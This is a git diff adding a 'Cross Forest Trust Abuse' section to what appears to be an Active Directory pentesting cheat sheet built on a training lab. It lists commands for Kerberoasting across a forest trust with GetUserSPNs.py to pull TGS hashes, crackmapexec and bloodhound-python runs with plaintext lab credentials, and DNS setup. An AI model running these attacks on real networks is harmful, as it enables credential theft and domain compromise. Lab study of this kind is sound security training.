@@ -36,3 +36,27 @@ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 ```
 
 https://github.com/ShutdownRepo/targetedKerberoast
+
+
+#### Cross Forest Trust Abuse
+
+Finding SPN entries with creds
+```shell-session
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
+Request TGS Hash (-request gives TGS -outputfile outputfile_name)
+```shell-session
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -outputfile kirbi.hash
+```
+
+Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf with DHCP not enabled
+```shell-session
+cat /etc/resolv.conf
+```
+
+After adding dhcp entry running bloodhound on INLANEFREIGHT.LOCAL
+```shell-session
+bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
+```
+
